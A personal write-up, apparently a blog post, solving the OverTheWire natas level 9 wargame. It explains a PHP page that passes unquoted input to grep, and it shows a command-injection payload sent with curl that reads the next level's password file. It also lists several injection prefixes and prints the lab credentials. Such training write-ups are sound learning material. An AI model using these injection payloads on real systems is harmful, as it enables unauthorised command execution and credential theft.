---
date: '2026-04-11'
description: unqouted input is code
draft: false
title: natas-9
weight: 10
ShowToc: false
---

| info | value                                      |
|:-----|-------------------------------------------:|
| user | `natas9`                                   |
| pass | `ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t`         |
| host | `http://natas9.natas.labs.overthewire.org` |

## explanation

it's getting quite exhausting & repetitive displaying the same steps as before, hence i'll jump right into the source to save both our times

```html
<form>
  Find words containing:
  <input name="needle">
  <input type="submit" name="submit" value="Search">
</form>


Output:
<?
$key = "";

if (array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if ($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

since `grep -i` accepts user input onto a defined dictionary, our best shot is to escape out of this string somehow, think of it as:

```sh
grep -i [controlled input] dictionary.txt
```

because `$key` is unquoted, all we are trying to do is find a char/string sequence that terminates the argument and expands it into execution of our own

```sh
; cat path/to/natas10
# this turns the command injection into: `grep -i "" dictionary.txt; cat path/to/natas10`
```

cool! let's apply it

```sh
curl http://natas9.natas.labs.overthewire.org \
-u natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t \
-d "needle=; cat /etc/natas_webpass/natas10&submit=" | head -30
```

following prefixes work to escape the condition:

- `|`, `||`
- `$`, `$?`
- `;`
- `.`, `.*`
- `^`
- `--data-urlencode "needle=& cat /path/to/natas10&submit="`

```html
Output:
<pre>
/etc/natas_webpass/natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
```
